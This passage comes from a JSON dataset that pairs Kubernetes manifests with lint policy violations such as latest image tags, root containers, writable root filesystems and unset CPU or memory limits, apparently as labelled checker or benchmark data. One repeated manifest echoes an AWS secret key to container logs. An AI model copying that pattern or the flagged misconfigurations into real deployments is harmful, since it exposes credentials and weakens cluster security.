    "violation_text": "The container \"init-ubuntu\" is using an invalid container image, \"ubuntu\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03837",
    "manifest_path": "data/manifests/the_stack_sample/sample_1711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  namespace: app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: app\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: app\n      annotations:\n        vault.security.banzaicloud.io/vault-addr: https://vault.vault:8200\n        vault.security.banzaicloud.io/vault-tls-secret: vault-tls\n    spec:\n      initContainers:\n      - name: init-ubuntu\n        image: ubuntu\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo initContainers ready\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#${.AWS_SECRET_ACCESS_KEY}\n      containers:\n      - name: app\n        image: alpine\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo going to sleep... && sleep 10000\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#AWS_SECRET_ACCESS_KEY\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"app\" does not have a read-only root file system"
  },
  {
    "id": "03838",
    "manifest_path": "data/manifests/the_stack_sample/sample_1711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  namespace: app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: app\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: app\n      annotations:\n        vault.security.banzaicloud.io/vault-addr: https://vault.vault:8200\n        vault.security.banzaicloud.io/vault-tls-secret: vault-tls\n    spec:\n      initContainers:\n      - name: init-ubuntu\n        image: ubuntu\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo initContainers ready\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#${.AWS_SECRET_ACCESS_KEY}\n      containers:\n      - name: app\n        image: alpine\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo going to sleep... && sleep 10000\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#AWS_SECRET_ACCESS_KEY\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init-ubuntu\" does not have a read-only root file system"
  },
  {
    "id": "03839",
    "manifest_path": "data/manifests/the_stack_sample/sample_1711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  namespace: app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: app\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: app\n      annotations:\n        vault.security.banzaicloud.io/vault-addr: https://vault.vault:8200\n        vault.security.banzaicloud.io/vault-tls-secret: vault-tls\n    spec:\n      initContainers:\n      - name: init-ubuntu\n        image: ubuntu\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo initContainers ready\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#${.AWS_SECRET_ACCESS_KEY}\n      containers:\n      - name: app\n        image: alpine\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo going to sleep... && sleep 10000\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#AWS_SECRET_ACCESS_KEY\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"app\" is not set to runAsNonRoot"
  },
  {
    "id": "03840",
    "manifest_path": "data/manifests/the_stack_sample/sample_1711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  namespace: app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: app\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: app\n      annotations:\n        vault.security.banzaicloud.io/vault-addr: https://vault.vault:8200\n        vault.security.banzaicloud.io/vault-tls-secret: vault-tls\n    spec:\n      initContainers:\n      - name: init-ubuntu\n        image: ubuntu\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo initContainers ready\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#${.AWS_SECRET_ACCESS_KEY}\n      containers:\n      - name: app\n        image: alpine\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo going to sleep... && sleep 10000\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#AWS_SECRET_ACCESS_KEY\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init-ubuntu\" is not set to runAsNonRoot"
  },
  {
    "id": "03841",
    "manifest_path": "data/manifests/the_stack_sample/sample_1711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  namespace: app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: app\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: app\n      annotations:\n        vault.security.banzaicloud.io/vault-addr: https://vault.vault:8200\n        vault.security.banzaicloud.io/vault-tls-secret: vault-tls\n    spec:\n      initContainers:\n      - name: init-ubuntu\n        image: ubuntu\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo initContainers ready\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#${.AWS_SECRET_ACCESS_KEY}\n      containers:\n      - name: app\n        image: alpine\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo going to sleep... && sleep 10000\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#AWS_SECRET_ACCESS_KEY\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"app\" has cpu request 0"
  },
  {
    "id": "03842",
    "manifest_path": "data/manifests/the_stack_sample/sample_1711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  namespace: app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: app\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: app\n      annotations:\n        vault.security.banzaicloud.io/vault-addr: https://vault.vault:8200\n        vault.security.banzaicloud.io/vault-tls-secret: vault-tls\n    spec:\n      initContainers:\n      - name: init-ubuntu\n        image: ubuntu\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo initContainers ready\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#${.AWS_SECRET_ACCESS_KEY}\n      containers:\n      - name: app\n        image: alpine\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo going to sleep... && sleep 10000\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#AWS_SECRET_ACCESS_KEY\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init-ubuntu\" has cpu request 0"
  },
  {
    "id": "03843",
    "manifest_path": "data/manifests/the_stack_sample/sample_1711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  namespace: app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: app\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: app\n      annotations:\n        vault.security.banzaicloud.io/vault-addr: https://vault.vault:8200\n        vault.security.banzaicloud.io/vault-tls-secret: vault-tls\n    spec:\n      initContainers:\n      - name: init-ubuntu\n        image: ubuntu\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo initContainers ready\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#${.AWS_SECRET_ACCESS_KEY}\n      containers:\n      - name: app\n        image: alpine\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo going to sleep... && sleep 10000\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#AWS_SECRET_ACCESS_KEY\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"app\" has memory limit 0"
  },
  {
    "id": "03844",
    "manifest_path": "data/manifests/the_stack_sample/sample_1711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  namespace: app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: app\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: app\n      annotations:\n        vault.security.banzaicloud.io/vault-addr: https://vault.vault:8200\n        vault.security.banzaicloud.io/vault-tls-secret: vault-tls\n    spec:\n      initContainers:\n      - name: init-ubuntu\n        image: ubuntu\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo initContainers ready\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#${.AWS_SECRET_ACCESS_KEY}\n      containers:\n      - name: app\n        image: alpine\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo going to sleep... && sleep 10000\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#AWS_SECRET_ACCESS_KEY\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init-ubuntu\" has memory limit 0"
  },
  {
    "id": "03845",
    "manifest_path": "data/manifests/the_stack_sample/sample_1712.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    test: liveness\n  name: liveness-http\nspec:\n  containers:\n  - name: liveness\n    image: k8s.gcr.io/liveness\n    args:\n    - /server\n    livenessProbe:\n      httpGet:\n        path: /healthz\n        port: 8080\n        httpHeaders:\n        - name: Custom-Header\n          value: Awesome\n      initialDelaySeconds: 3\n      periodSeconds: 3\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"liveness\" is using an invalid container image, \"k8s.gcr.io/liveness\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03846",
    "manifest_path": "data/manifests/the_stack_sample/sample_1712.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    test: liveness\n  name: liveness-http\nspec:\n  containers:\n  - name: liveness\n    image: k8s.gcr.io/liveness\n    args:\n    - /server\n    livenessProbe:\n      httpGet:\n        path: /healthz\n        port: 8080\n        httpHeaders:\n        - name: Custom-Header\n          value: Awesome\n      initialDelaySeconds: 3\n      periodSeconds: 3\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"liveness\" does not have a read-only root file system"
  },
  {
    "id": "03847",
    "manifest_path": "data/manifests/the_stack_sample/sample_1712.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    test: liveness\n  name: liveness-http\nspec:\n  containers:\n  - name: liveness\n    image: k8s.gcr.io/liveness\n    args:\n    - /server\n    livenessProbe:\n      httpGet:\n        path: /healthz\n        port: 8080\n        httpHeaders:\n        - name: Custom-Header\n          value: Awesome\n      initialDelaySeconds: 3\n      periodSeconds: 3\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"liveness\" is not set to runAsNonRoot"
  },
  {
    "id": "03848",
    "manifest_path": "data/manifests/the_stack_sample/sample_1712.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    test: liveness\n  name: liveness-http\nspec:\n  containers:\n  - name: liveness\n    image: k8s.gcr.io/liveness\n    args:\n    - /server\n    livenessProbe:\n      httpGet:\n        path: /healthz\n        port: 8080\n        httpHeaders:\n        - name: Custom-Header\n          value: Awesome\n      initialDelaySeconds: 3\n      periodSeconds: 3\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"liveness\" has cpu request 0"
  },
  {
    "id": "03849",
    "manifest_path": "data/manifests/the_stack_sample/sample_1712.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    test: liveness\n  name: liveness-http\nspec:\n  containers:\n  - name: liveness\n    image: k8s.gcr.io/liveness\n    args:\n    - /server\n    livenessProbe:\n      httpGet:\n        path: /healthz\n        port: 8080\n        httpHeaders:\n        - name: Custom-Header\n          value: Awesome\n      initialDelaySeconds: 3\n      periodSeconds: 3\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"liveness\" has memory limit 0"
  },
  {
    "id": "03850",
    "manifest_path": "data/manifests/the_stack_sample/sample_1713.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-347\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03851",
    "manifest_path": "data/manifests/the_stack_sample/sample_1713.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-347\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03852",
    "manifest_path": "data/manifests/the_stack_sample/sample_1713.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-347\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03853",
    "manifest_path": "data/manifests/the_stack_sample/sample_1713.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-347\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03854",
    "manifest_path": "data/manifests/the_stack_sample/sample_1713.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-347\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03855",
    "manifest_path": "data/manifests/the_stack_sample/sample_1714.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample-nginx-dp\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-dp\n  template:\n    metadata:\n      labels:\n        app: nginx-dp\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03856",
    "manifest_path": "data/manifests/the_stack_sample/sample_1714.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample-nginx-dp\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-dp\n  template:\n    metadata:\n      labels:\n        app: nginx-dp\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03857",
    "manifest_path": "data/manifests/the_stack_sample/sample_1714.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample-nginx-dp\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-dp\n  template:\n    metadata:\n      labels:\n        app: nginx-dp\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03858",
    "manifest_path": "data/manifests/the_stack_sample/sample_1714.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample-nginx-dp\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-dp\n  template:\n    metadata:\n      labels:\n        app: nginx-dp\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.15\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03859",
    "manifest_path": "data/manifests/the_stack_sample/sample_1715.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20220330-40eb179576\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"horologium\" does not have a read-only root file system"
  },
  {
    "id": "03860",
    "manifest_path": "data/manifests/the_stack_sample/sample_1715.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20220330-40eb179576\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"horologium\" is not set to runAsNonRoot"
  },
  {
    "id": "03861",
    "manifest_path": "data/manifests/the_stack_sample/sample_1715.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20220330-40eb179576\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"horologium\" has cpu request 0"
  },
  {
    "id": "03862",
    "manifest_path": "data/manifests/the_stack_sample/sample_1715.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20220330-40eb179576\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"horologium\" has memory limit 0"
  },
  {
    "id": "03863",
    "manifest_path": "data/manifests/the_stack_sample/sample_1717.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crime-detail-api-endpoint\n  namespace: api-services\n  labels:\n    app: crime-detail-api-endpoint\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crime-detail-api-endpoint\n  template:\n    metadata:\n      labels:\n        app: crime-detail-api-endpoint\n    spec:\n      containers:\n      - name: crime-detail-api-endpoint\n        image: usfinthere/crime_detail_api:latest\n        imagePullPolicy: Always\n        envFrom:\n        - secretRef:\n            name: postgres-secret\n        ports:\n        - name: http\n          containerPort: 8080\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"crime-detail-api-endpoint\" is using an invalid container image, \"usfinthere/crime_detail_api:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03864",
    "manifest_path": "data/manifests/the_stack_sample/sample_1717.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crime-detail-api-endpoint\n  namespace: api-services\n  labels:\n    app: crime-detail-api-endpoint\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crime-detail-api-endpoint\n  template:\n    metadata:\n      labels:\n        app: crime-detail-api-endpoint\n    spec:\n      containers:\n      - name: crime-detail-api-endpoint\n        image: usfinthere/crime_detail_api:latest\n        imagePullPolicy: Always\n        envFrom:\n        - secretRef:\n            name: postgres-secret\n        ports:\n        - name: http\n          containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"crime-detail-api-endpoint\" does not have a read-only root file system"
  },
  {
    "id": "03865",
    "manifest_path": "data/manifests/the_stack_sample/sample_1717.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crime-detail-api-endpoint\n  namespace: api-services\n  labels:\n    app: crime-detail-api-endpoint\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crime-detail-api-endpoint\n  template:\n    metadata:\n      labels:\n        app: crime-detail-api-endpoint\n    spec:\n      containers:\n      - name: crime-detail-api-endpoint\n        image: usfinthere/crime_detail_api:latest\n        imagePullPolicy: Always\n        envFrom:\n        - secretRef:\n            name: postgres-secret\n        ports:\n        - name: http\n          containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"crime-detail-api-endpoint\" is not set to runAsNonRoot"
  },
  {
    "id": "03866",
    "manifest_path": "data/manifests/the_stack_sample/sample_1717.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crime-detail-api-endpoint\n  namespace: api-services\n  labels:\n    app: crime-detail-api-endpoint\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crime-detail-api-endpoint\n  template:\n    metadata:\n      labels:\n        app: crime-detail-api-endpoint\n    spec:\n      containers:\n      - name: crime-detail-api-endpoint\n        image: usfinthere/crime_detail_api:latest\n        imagePullPolicy: Always\n        envFrom:\n        - secretRef:\n            name: postgres-secret\n        ports:\n        - name: http\n          containerPort: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"crime-detail-api-endpoint\" has cpu request 0"
  },
  {
    "id": "03867",
    "manifest_path": "data/manifests/the_stack_sample/sample_1717.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crime-detail-api-endpoint\n  namespace: api-services\n  labels:\n    app: crime-detail-api-endpoint\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crime-detail-api-endpoint\n  template:\n    metadata:\n      labels:\n        app: crime-detail-api-endpoint\n    spec:\n      containers:\n      - name: crime-detail-api-endpoint\n        image: usfinthere/crime_detail_api:latest\n        imagePullPolicy: Always\n        envFrom:\n        - secretRef:\n            name: postgres-secret\n        ports:\n        - name: http\n          containerPort: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"crime-detail-api-endpoint\" has memory limit 0"
  },
  {
    "id": "03868",
    "manifest_path": "data/manifests/the_stack_sample/sample_1718.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-controller-manager\nspec:\n  containers:\n  - command:\n    - /bin/sh\n    - -c\n    - /usr/local/bin/kube-controller-manager --master=127.0.0.1:8080 --cluster-name=e2e-test-bburns\n      --cluster-cidr=10.245.0.0/16 --allocate-node-cidrs=true --cloud-provider=gce  --service-account-private-key-file=/srv/kubernetes/server.key\n      --v=2 1>>/var/log/kube-controller-manager.log --leader-elect 2>&1\n    image: k8s.gcr.io/kube-controller-manager:fda24638d51a48baa13c35337fcd4793\n    livenessProbe:\n      httpGet:\n        path: /healthz\n        port: 10252\n      initialDelaySeconds: 15\n      timeoutSeconds: 1\n    name: kube-controller-manager\n    volumeMounts:\n    - mountPath: /srv/kubernetes\n      name: srvkube\n      readOnly: true\n    - mountPath: /var/log/kube-controller-manager.log\n      name: logfile\n    - mountPath: /etc/ssl\n      name: etcssl\n      readOnly: true\n    - mountPath: /usr/share/ssl\n      name: usrsharessl\n      readOnly: true\n    - mountPath: /var/ssl\n      name: varssl\n      readOnly: true\n    - mountPath: /usr/ssl\n      name: usrssl\n      readOnly: true\n    - mountPath: /usr/lib/ssl\n      name: usrlibssl\n      readOnly: true\n    - mountPath: /usr/local/openssl\n      name: usrlocalopenssl\n      readOnly: true\n    - mountPath: /etc/openssl\n      name: etcopenssl\n      readOnly: true\n    - mountPath: /etc/pki/tls\n      name: etcpkitls\n      readOnly: true\n  volumes:\n  - hostPath:\n      path: /srv/kubernetes\n    name: srvkube\n  - hostPath:\n      path: /var/log/kube-controller-manager.log\n      type: FileOrCreate\n    name: logfile\n  - hostPath:\n      path: /etc/ssl\n    name: etcssl\n  - hostPath:\n      path: /usr/share/ssl\n    name: usrsharessl\n  - hostPath:\n      path: /var/ssl\n    name: varssl\n  - hostPath:\n      path: /usr/ssl\n    name: usrssl\n  - hostPath:\n      path: /usr/lib/ssl\n    name: usrlibssl\n  - hostPath:\n      path: /usr/local/openssl\n    name: usrlocalopenssl\n  - hostPath:\n      path: /etc/openssl\n    name: etcopenssl\n  - hostPath:\n      path: /etc/pki/tls\n    name: etcpkitls\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-controller-manager\" does not have a read-only root file system"
  },
  {
    "id": "03869",
    "manifest_path": "data/manifests/the_stack_sample/sample_1718.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-controller-manager\nspec:\n  containers:\n  - command:\n    - /bin/sh\n    - -c\n    - /usr/local/bin/kube-controller-manager --master=127.0.0.1:8080 --cluster-name=e2e-test-bburns\n      --cluster-cidr=10.245.0.0/16 --allocate-node-cidrs=true --cloud-provider=gce  --service-account-private-key-file=/srv/kubernetes/server.key\n      --v=2 1>>/var/log/kube-controller-manager.log --leader-elect 2>&1\n    image: k8s.gcr.io/kube-controller-manager:fda24638d51a48baa13c35337fcd4793\n    livenessProbe:\n      httpGet:\n        path: /healthz\n        port: 10252\n      initialDelaySeconds: 15\n      timeoutSeconds: 1\n    name: kube-controller-manager\n    volumeMounts:\n    - mountPath: /srv/kubernetes\n      name: srvkube\n      readOnly: true\n    - mountPath: /var/log/kube-controller-manager.log\n      name: logfile\n    - mountPath: /etc/ssl\n      name: etcssl\n      readOnly: true\n    - mountPath: /usr/share/ssl\n      name: usrsharessl\n      readOnly: true\n    - mountPath: /var/ssl\n      name: varssl\n      readOnly: true\n    - mountPath: /usr/ssl\n      name: usrssl\n      readOnly: true\n    - mountPath: /usr/lib/ssl\n      name: usrlibssl\n      readOnly: true\n    - mountPath: /usr/local/openssl\n      name: usrlocalopenssl\n      readOnly: true\n    - mountPath: /etc/openssl\n      name: etcopenssl\n      readOnly: true\n    - mountPath: /etc/pki/tls\n      name: etcpkitls\n      readOnly: true\n  volumes:\n  - hostPath:\n      path: /srv/kubernetes\n    name: srvkube\n  - hostPath:\n      path: /var/log/kube-controller-manager.log\n      type: FileOrCreate\n    name: logfile\n  - hostPath:\n      path: /etc/ssl\n    name: etcssl\n  - hostPath:\n      path: /usr/share/ssl\n    name: usrsharessl\n  - hostPath:\n      path: /var/ssl\n    name: varssl\n  - hostPath:\n      path: /usr/ssl\n    name: usrssl\n  - hostPath:\n      path: /usr/lib/ssl\n    name: usrlibssl\n  - hostPath:\n      path: /usr/local/openssl\n    name: usrlocalopenssl\n  - hostPath:\n      path: /etc/openssl\n    name: etcopenssl\n  - hostPath:\n      path: /etc/pki/tls\n    name: etcpkitls\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-controller-manager\" is not set to runAsNonRoot"
  },
  {
    "id": "03870",
    "manifest_path": "data/manifests/the_stack_sample/sample_1718.yaml",
